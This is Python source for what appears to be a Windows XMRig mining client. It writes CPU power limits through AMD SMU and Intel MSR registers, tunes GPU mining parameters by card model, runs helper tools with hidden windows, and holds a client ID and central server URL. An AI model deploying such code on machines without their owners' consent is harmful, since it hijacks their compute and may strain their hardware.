import asyncio
import ctypes
import sys
import time
from typing import Optional

import clr
from threading import Thread, Event

from cpuinfo import cpuinfo

try:
    clr.AddReference("LibreHardwareMonitorLib")
    from LibreHardwareMonitor.Hardware import Computer, HardwareType, SensorType
except Exception as e:
    print(f"[!] FATAL: Could not load LibreHardwareMonitorLib: {e}")
    sys.exit(1)

import subprocess
import os
import sys



class RyzenSMUManager:
    # ─── MSR addresses ───────────────────────────────────────────────────────
    SMU_MSR_CMD  = 0xC001_0304
    SMU_MSR_ARG0 = 0xC001_0305
    SMU_MSR_RSP  = 0xC001_0308

    # ─── MP1 message IDs ─────────────────────────────────────────────────────
    SMC_MSG_SetSustainedPptLimit = 0x1A
    SMC_MSG_SetFastPptLimit      = 0x1B
    SMC_MSG_SetSlowPptLimit      = 0x1C
    SMC_MSG_EnableFeatures       = 0x05          # new
    PPT_FEATURE_BIT              = 1 << 3        # new (0x8)

    EXECUTE_BIT = 1 << 31

    # ─── status codes ────────────────────────────────────────────────────────
    SMU_RSP_OK            = (0x00, 0x01)
    SMU_RSP_UNKNOWN_CMD   = 0xFF
    SMU_RSP_CMD_REJECTED  = 0xFE
    SMU_RSP_CMD_PREREQ    = 0xFD   # “rejected – prereq not met”

    # ─── init ────────────────────────────────────────────────────────────────


    def __init__(self, logger, tools_dir: str = "tools"):
        self.logger = logger
        self.core0  = ["-p", "0"]    # mailbox lives on core 0

        root = getattr(sys, "_MEIPASS", os.path.dirname(__file__))
        self.cmd_path = os.path.join(root, tools_dir, "msr-cmd.exe")

        self.initialized     = os.path.isfile(self.cmd_path)
        self.ppt_feature_on  = False   # track EnableFeatures state

        if self.initialized:
            logger.log_message(f"[+] msr‑cmd found → {self.cmd_path}")
        else:
            logger.log_message(f"[!] msr‑cmd not found at {self.cmd_path}")

    # ─── low‑level helpers ───────────────────────────────────────────────────
    def _run_msr(self, extra_args, *args) -> Optional[str]:
        if not self.initialized:
            return None
        cmd = [self.cmd_path] + extra_args + list(args)
        try:
            res = subprocess.run(
                cmd, text=True, capture_output=True,
                creationflags=subprocess.CREATE_NO_WINDOW, timeout=2.0
            )
            if res.returncode:
                self.logger.log_message(f"[!] msr‑cmd exit {res.returncode}: {res.stderr.strip()}")
                return None
            return res.stdout.strip()
        except Exception as e:
            self.logger.log_message(f"[!] msr‑cmd exception: {e}")
            return None

    def _write_msr(self, addr: int, val: int) -> bool:
        lo, hi = val & 0xFFFFFFFF, (val >> 32) & 0xFFFFFFFF
        return self._run_msr(self.core0, "write", hex(addr), hex(hi), hex(lo)) is not None

    def _read_msr(self, addr: int) -> Optional[int]:
        out = self._run_msr(self.core0 + ["-d"], "read", hex(addr))
        if not out:
            return None
        try:
            edx, eax = out.split()[-2:]
            return (int(edx, 16) << 32) | int(eax, 16)
        except Exception:
            return None

    # ─── mailbox helpers ─────────────────────────────────────────────────────
    def _force_clear_mailbox(self) -> bool:
        """Write 0 to SMU_MSR_CMD and verify EXECUTE_BIT is clear."""
        if not self._write_msr(self.SMU_MSR_CMD, 0):
            return False
        time.sleep(0.001)          # give SMU a tick
        status = self._read_msr(self.SMU_MSR_CMD)
        return status is not None and not (status & self.EXECUTE_BIT)

    def _wait_for_smu(self, timeout_ms: int = 100) -> bool:
        """Poll until EXECUTE_BIT clears; auto‑clear if it never does."""
        for _ in range(timeout_ms):
            status = self._read_msr(self.SMU_MSR_CMD)
            if status is None:
                return False
            if not (status & self.EXECUTE_BIT):
                return True
            time.sleep(0.001)

        # timed out → try hard reset once
        self.logger.log_message("[*] Mailbox stuck → forcing clear")
        return self._force_clear_mailbox()

    def _enable_ppt_feature(self) -> bool:
        """Send EnableFeatures(PPT) once per boot."""
        if self.ppt_feature_on:
            return True
        rsp = self._send_mp1(self.SMC_MSG_EnableFeatures,
                             self.PPT_FEATURE_BIT)
        self.logger.log_message(f"[!]SMU RSP:{rsp}")
        ok = rsp is not None and (rsp & 0xFF) in self.SMU_RSP_OK
        if ok:
            self.ppt_feature_on = True
        else:
            self.logger.log_message("[!] Could not enable PPT feature")
        return ok

    def _send_mp1(self, msg_id: int, arg0: int = 0) -> Optional[int]:
        if not self._wait_for_smu():
            self.logger.log_message("[!] SMU busy – giving up")
            return None

        if not (self._write_msr(self.SMU_MSR_RSP, 0) and
                self._write_msr(self.SMU_MSR_ARG0, arg0) and
                self._write_msr(self.SMU_MSR_CMD, msg_id)):
            self.logger.log_message("[!] MSR write sequence failed")
            return None

        if not self._wait_for_smu():
            self.logger.log_message("[!] SMU never cleared EXECUTE_BIT")
            return None


        cmd_val = self._read_msr(self.SMU_MSR_RSP)
        return (cmd_val & 0xFF) if cmd_val is not None else None

    # ─── public API ──────────────────────────────────────────────────────────
    def set_ppt_limit(self, watts: int, kind: str = "fast") -> bool:
        if not self.initialized:
            self.logger.log_message("[!] SMU Manager not initialized")
            return False

        ids = {
            "sustained": self.SMC_MSG_SetSustainedPptLimit,
            "fast":      self.SMC_MSG_SetFastPptLimit,
            "slow":      self.SMC_MSG_SetSlowPptLimit,
        }
        msg = ids.get(kind.lower())
        if msg is None:
            self.logger.log_message("[!] PPT kind must be fast/slow/sustained")
            return False

        if not self._enable_ppt_feature():
            return False

        mw  = watts * 1000
        self.logger.log_message(f"[*] Setting {kind} PPT → {watts} W")

        rsp = self._send_mp1(msg, mw)
        if rsp in self.SMU_RSP_OK:
            self.logger.log_message(f"[+] {kind.capitalize()} PPT now {watts} W")
            return True

        errmsg = {
            self.SMU_RSP_UNKNOWN_CMD:  "Unknown command",
            self.SMU_RSP_CMD_REJECTED: "Rejected (locked in BIOS)",
            self.SMU_RSP_CMD_PREREQ:   "Prerequisite missing",
        }.get(rsp, f"SMU responded 0x{rsp:02X}" if rsp is not None else "timeout")
        self.logger.log_message(f"[!] PPT write failed: {errmsg}")
        return False
class MSRManager:
    def __init__(self, logger, is_intel):
        self.logger = logger
        self.initialized = False
        self.is_intel_cpu = is_intel
        self.base_path = ""
        if self.is_intel_cpu:
            try:
                if getattr(sys, 'frozen', False):
                    # PyInstaller bundle: use extracted tools directory inside _MEIPASS
                    self.base_path = os.path.join(sys._MEIPASS, 'tools')
                else:
                    # Dev environment: use tools directory relative to script
                    self.base_path = os.path.join(os.path.dirname(__file__), 'tools')

                self.cmd_path = os.path.join(self.base_path, "msr-cmd.exe")

                if not os.path.exists(self.cmd_path):
                    raise FileNotFoundError(f"msr-cmd.exe not found at {self.cmd_path}")
                else:
                    self.logger.log_message("[+] msr-cmd.exe found")

                self.initialized = True

            except Exception as e:
                self.logger.log_message(f"[!] MSRManager init failed: {e}")
                self.initialized = False
        else:
            self.logger.log_message("[+] msr-cmd.exe not initialized non intel")

    def _run(self, args):
        if not self.initialized:
            return None
        try:
            result = subprocess.run([self.cmd_path] + args, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW, cwd=self.base_path)
            if result.returncode != 0:
                self.logger.log_message(f"[!] msr-cmd failed: {result.stderr.strip()}")
                return None
            return result.stdout.strip()
        except Exception as e:
            self.logger.log_message(f"[!] msr-cmd execution error: {e}")
            return None

    def read_to_msr(self, index):
        output = self._run(["read", hex(index)])
        if output:
            try:
                # Expecting something like: "MSR[0x610]=0x0000823000008230"
                hex_val = output.split('=')[-1].strip()
                value = int(hex_val, 16)
                low = value & 0xFFFFFFFF
                high = (value >> 32) & 0xFFFFFFFF
                return low, high
            except Exception as e:
                self.logger.log_message(f"[!] Failed to parse MSR read output: {output}")
        return None, None

    def write_to_msr(self, index, low, high):
        return self._run(["write", hex(index), hex(high), hex(low)]) is not None

    def set_pl1_pl2(self, power_watts):
        if not self.initialized:
            self.logger.log_message(f"[!] PL1/PL2 set failed (not initialized).")
            return False
        if not self.is_intel_cpu:
            self.logger.log_message(f"[!] PL1/PL2 set failed (not Intel).")
            return False

        MSR_RAPL_POWER_LIMIT = 0x610
        power_unit = 0.125
        raw_limit = int(power_watts / power_unit) & 0x7FFF

        value = raw_limit | (1 << 15) | (raw_limit << 32) | (1 << 47)
        low = value & 0xFFFFFFFF
        high = (value >> 32) & 0xFFFFFFFF

        self.logger.log_message(f"[*] Setting PL1/PL2 to {power_watts}W → EDX={high:#010x}, EAX={low:#010x}")
        return self.write_to_msr(MSR_RAPL_POWER_LIMIT, low, high)


class ProcessManager:
    """A helper class to manage Windows process attributes using the Windows API."""

    def __init__(self, logger):
        self.logger = logger
        # Define necessary Windows API components
        self.kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
        self.PROCESS_SET_QUOTA = 0x0100
        self.PROCESS_QUERY_INFORMATION = 0x0400
        self.PROCESS_SET_INFORMATION = 0x0200


    def recommend_max_memory(self):
        """
        Calculates a recommended max working set size based on total system RAM.
        Returns the recommended size in megabytes (MB).
        """
        # Prepare a variable to hold the result from the API call
        total_ram_kb = ctypes.c_ulonglong()

        # Call GetPhysicallyInstalledSystemMemory to get total RAM in kilobytes
        if not self.kernel32.GetPhysicallyInstalledSystemMemory(ctypes.byref(total_ram_kb)):
            self.logger.log_message(f"[!] Could not get total system memory. Error: {ctypes.get_last_error()}")
            return None # Return None on failure

        total_ram_mb = total_ram_kb.value / 1024
        self.logger.log_message(f"[*] Total system RAM detected: {total_ram_mb:.0f} MB")

        recommended_mb = total_ram_mb


        return int(recommended_mb)

    def set_priority_boost(self, pid, enable_boost):
        """
        Enables or disables dynamic priority boosting for a process's threads.
        :param pid: The process ID.
        :param enable_boost: Set to True to enable boosting, False to disable it.
        """
        if not pid:
            self.logger.log_message("[!] Cannot set priority boost: Invalid PID.")
            return False

        h_process = self.kernel32.OpenProcess(self.PROCESS_SET_INFORMATION, False, pid)

        if not h_process:
            self.logger.log_message(
                f"[!] Set priority boost: Failed to get handle for PID {pid}. Error: {ctypes.get_last_error()}")
            return False

        success = False
        try:
            # Determine the state for logging purposes based on the new parameter
            state = "enabled" if enable_boost else "disabled"


            # Call the API with the inverse of the enable_boost flag
            if self.kernel32.SetProcessPriorityBoost(h_process, not enable_boost):
                success = True
            else:
                self.logger.log_message(
                    f"[!] Failed to set priority boost for PID {pid}. Error: {ctypes.get_last_error()}")
        finally:
            self.kernel32.CloseHandle(h_process)

        return success

    def set_working_set_size(self, pid, min_size_mb, max_size_mb):
        """
        Suggests a memory working set size for a given process ID.
        This is a suggestion to the kernel, not a strict limit.
        """
        if not pid:
            self.logger.log_message("[!] Cannot set working set: Invalid PID.")
            return False

        min_bytes = int(min_size_mb * 1024 * 1024)
        max_bytes = int(max_size_mb * 1024 * 1024)

        # Get a handle to the process with the required permissions
        h_process = self.kernel32.OpenProcess(
            self.PROCESS_SET_QUOTA | self.PROCESS_QUERY_INFORMATION,
            False,
            pid
        )

        if not h_process:
            self.logger.log_message(f"[!] Failed to get handle for PID {pid}. Error: {ctypes.get_last_error()}")
            return False

        success = False
        try:
            self.logger.log_message(f"[*] Suggesting working set for PID {pid}: Min {min_size_mb}MB, Max {max_size_mb}MB.")
            # Call the SetProcessWorkingSetSizeEx API function
            if self.kernel32.SetProcessWorkingSetSizeEx(h_process,
                                                      ctypes.c_size_t(min_bytes),
                                                      ctypes.c_size_t(max_bytes),
                                                      0): # Flags=0 for soft limits
                self.logger.log_message(f"[+] Successfully sent working set size suggestion for PID {pid}.")
                success = True
            else:
                self.logger.log_message(f"[!] Failed to set working set size for PID {pid}. Error: {ctypes.get_last_error()}")
        finally:
            # Always ensure the handle is closed
            self.kernel32.CloseHandle(h_process)

        return success

class HardwareMonitor(Thread):
    """
    A dedicated, self-healing thread to safely manage LibreHardwareMonitor.
    It can now recover from internal library crashes by re-initializing.
    It also handles GPU detection to avoid resource conflicts.
    """

    def __init__(self, logger):
        super().__init__(daemon=True)
        self.logger = logger
        self._stop_event = Event()

        # Public attributes to hold the latest data
        self.cpu_temperature_formatted = "N/A"
        self.total_power_draw = "N/A"
        self.has_nvidia_gpu = False  # Flag for GPU detection
        self.tuner = {
                        "index": 0,
                        "affinity": -1,
                        "dataset_host": False
                    }
        # Internal state
        self.computer = None
        self._cpu_temp_sensors = []
        self._power_sensors = []
        self._unique_hardware = set()

    def _initialize(self):
        """(Re)Initializes the Computer object and finds all necessary sensors."""
        try:
            self.logger.log_message("[+] Initializing hardware monitor...")
            self.computer = Computer()
            self.computer.IsCpuEnabled = True
            self.computer.IsGpuEnabled = True
            self.computer.Open()

            # Clear previous state
            self._cpu_temp_sensors.clear()
            self._power_sensors.clear()
            self._unique_hardware.clear()
            self.has_nvidia_gpu = False  # Reset flag on re-initialization
            self.gpu_name = None
            self.vram_mb = 0
            # Find sensors and their parent hardware
            for hardware in self.computer.Hardware:
                hardware.Update()

                # Consolidated check for NVIDIA GPU
                if "nvidia" in str(hardware.HardwareType).lower():
                    self.has_nvidia_gpu = True
                    self.gpu_name = hardware.Name.lower()
                    hardware.Update()
                    for sensor in hardware.Sensors:
                        if sensor.SensorType == SensorType.SmallData and "memory total" in sensor.Name.lower():
                            if sensor.Value is not None:
                                self.vram_mb = int(sensor.Value)  # Usually reported in MB
                    self.logger.log_message(f"[+] Detected GPU: {self.gpu_name}, VRAM: {self.vram_mb}MB")

                    # Heuristic logic
                    if "1050" in self.gpu_name:
                        self.tuner.update(dict(threads=1, blocks=32, bfactor=7, bsleep=30))
                    elif "2060" in self.gpu_name or "3050" in self.gpu_name:
                        self.tuner.update(dict(threads=2, blocks=40, bfactor=6, bsleep=25))
                    elif "3060" in self.gpu_name:
                        self.tuner.update(dict(threads=1, blocks=44, bfactor=5, bsleep=15))
                    elif "3070" in self.gpu_name or "3080" in self.gpu_name:
                        self.tuner.update(dict(threads=2, blocks=56, bfactor=5, bsleep=20))
                    elif "1660" in self.gpu_name:
                        self.tuner.update(dict(threads=2, blocks=40, bfactor=6, bsleep=20))
                    elif self.vram_mb >= 16000:
                        self.tuner.update(dict(threads=2, blocks=72, bfactor=4, bsleep=10))
                    elif self.vram_mb >= 12000:
                        self.tuner.update(dict(threads=2, blocks=64, bfactor=5, bsleep=12))
                    elif self.vram_mb >= 8000:
                        self.tuner.update(dict(threads=2, blocks=48, bfactor=5, bsleep=15))
                    elif self.vram_mb >= 6000:
                        self.tuner.update(dict(threads=2, blocks=40, bfactor=6, bsleep=20))
                    else:
                        self.tuner.update(dict(threads=1, blocks=32, bfactor=6, bsleep=30))

                for sensor in hardware.Sensors:
                    if sensor.SensorType == SensorType.Temperature and "cpu" in str(hardware.HardwareType).lower():
                        self._cpu_temp_sensors.append(sensor)
                    elif sensor.SensorType == SensorType.Power:
                        self._power_sensors.append(sensor)
                for subhardware in hardware.SubHardware:
                    subhardware.Update()
                    for sensor in subhardware.Sensors:
                        if sensor.SensorType == SensorType.Power and sensor.Value is not None:
                            self._power_sensors.append(sensor)

            self._unique_hardware = {s.Hardware for s in self._cpu_temp_sensors + self._power_sensors}
            self.logger.log_message("[+] Hardware monitor initialized successfully.")
            if self.has_nvidia_gpu:
                self.logger.log_message("[+] NVIDIA GPU detected by hardware monitor.")
            return True
        except Exception as e:
            self.logger.log_message(f"[!] Critical error during hardware monitor initialization: {e}")
            self._close()
            return False

    def _close(self):
        """Safely closes the computer object to release resources."""
        if self.computer:
            try:
                self.computer.Close()
                self.logger.log_message("[+] Hardware monitor resources released.")
            except Exception as e:
                self.logger.log_message(f"[!] Error closing hardware monitor: {e}")
            finally:
                self.computer = None

    def _perform_update(self):
        """Performs one update cycle. Returns False if a critical error occurs."""
        try:
            for hardware in self._unique_hardware:
                hardware.Update()

            cpu_temps = [s.Value for s in self._cpu_temp_sensors if s.Value is not None]
            if cpu_temps:
                max_temp_c = max(cpu_temps)
                max_temp_f = (max_temp_c * 9 / 5) + 32
                self.cpu_temperature_formatted = f"{max_temp_c:.1f}°C / {max_temp_f:.1f}°F"

            power_vals = [s.Value for s in self._power_sensors if s.Value is not None]
            if power_vals:
                self.total_power_draw = f"{sum(power_vals):.2f} W"

            return True
        except Exception as e:
            self.logger.log_message(f"[!] Unrecoverable error in hardware monitor update: {e}")
            self.logger.log_message("[!] The hardware monitor will now attempt to restart.")
            return False

    def run(self):
        """The main self-healing loop for the monitoring thread."""
        # Initial initialization attempt
        if not self._initialize():
            # If it fails right away, wait before entering the main loop
            self._stop_event.wait(30)

        while not self._stop_event.is_set():
            if self.computer is None:
                if not self._initialize():
                    self._stop_event.wait(30)
                    continue

            if not self._perform_update():
                self._close()
                self._stop_event.wait(15)
                continue

            self._stop_event.wait(2)

        # Final cleanup once the stop event is set
        self._close()

    def stop(self):
        """Signals the thread to stop."""
        self._stop_event.set()

    def deinitialize(self):
        """Public method to stop and clean up the hardware monitor thread."""
        self.logger.log_message("[*] Deinitializing hardware monitor...")
        self.stop()
        self.join(timeout=5)  # Ensure cleanup finishes
        self.logger.log_message("[+] Hardware monitor shut down cleanly.")

    def get_max_power_draw(self):
        """
        Attempts to find the CPU's power limit from sensors.
        If not found, falls back to a heuristic based on the CPU name.
        Returns an integer value in Watts.
        """
        if not self.computer:
            self.logger.log_message("[!] Cannot get max power draw: Hardware monitor not initialized.")
            return 125  # Return a safe default if not initialized

        # --- Fallback Method: Heuristic based on CPU name ---
        cpu_name = ""
        try:
            for hardware in self.computer.Hardware:
                if "cpu" in str(hardware.HardwareType).lower():
                    cpu_name = hardware.Name.lower()
                    break
        except Exception:
            # If LHM fails, try cpuinfo as a backup
            try:
                import cpuinfo
                cpu_name = cpuinfo.get_cpu_info().get('brand_raw', '').lower()
            except Exception as e:
                self.logger.log_message(f"[!] Could not determine CPU name for power heuristic: {e}")
                return 125 # Fallback to default

        self.logger.log_message(f"[*] No power limit sensor found. Using heuristic for CPU: '{cpu_name}'")

        if "i9" in cpu_name or "ryzen 9" in cpu_name:
            return 170
        if "i7" in cpu_name or "ryzen 7" in cpu_name:
            return 120
        if "i5" in cpu_name or "ryzen 5" in cpu_name:
            return 80
        if "i3" in cpu_name or "ryzen 3" in cpu_name:
            return 45

        self.logger.log_message("[!] CPU model not recognized for power heuristic, returning default.")
        return 220 # Default for unknown CPUs


class XmrigData:
    def __init__(self, Logger):
        self.xmrig_process = None
        self.output_queue = asyncio.Queue()
        self.FLASK_SERVER_URL = None
        self.client_id = None
        self.miner_lock = asyncio.Lock()
        self.last_known_pool_url = None
        self.last_known_thread_count = None
        self.custom_pool_url = None
        self.client_status = "Stopped"
        self.threads = None
        self.aiohttp_client_session = None
        self._latest_hashrate = 0.0
        self._latest_cpu_accepted_shares = 0
        self._latest_nvidia_accepted_shares = 0
        self._latest_gpu_temp = "N/A"
        self._latest_gpu_fan = "N/A"
        self.XMRIG_PATH = os.path.join(os.path.dirname(sys.executable), "xmrig.exe")
        self.CONFIG_PATH = os.path.join(os.path.dirname(sys.executable), "config.json")
        self.logger = Logger
        self.brand = ""
        if 'intel' in cpuinfo.get_cpu_info().get('brand_raw', '').lower():
            self.brand = "intel"
        else:
            self.brand = "ryzen"
        self.hardware_monitor = HardwareMonitor(self.logger)
        self.process_manager = ProcessManager(self.logger)
        self.msr_manager = MSRManager(self.logger, self.brand == "intel")
        self.ryzen_manager = RyzenSMUManager(self.logger, )

    async def get_power_draw_async(self):
        """Async wrapper to get total power draw from the monitor thread."""
        if self.hardware_monitor:
            return self.hardware_monitor.total_power_draw
        return "N/A"

    async def get_cpu_temperature_async(self):
        """Async wrapper to get CPU temperature from the monitor thread."""
        if self.hardware_monitor:
            return self.hardware_monitor.cpu_temperature_formatted
        return "N/A"

    async def has_nvidia_gpu_async(self):
        """Async wrapper to check if an NVIDIA GPU was detected."""
        if self.hardware_monitor:
            return self.hardware_monitor.has_nvidia_gpu
        return False

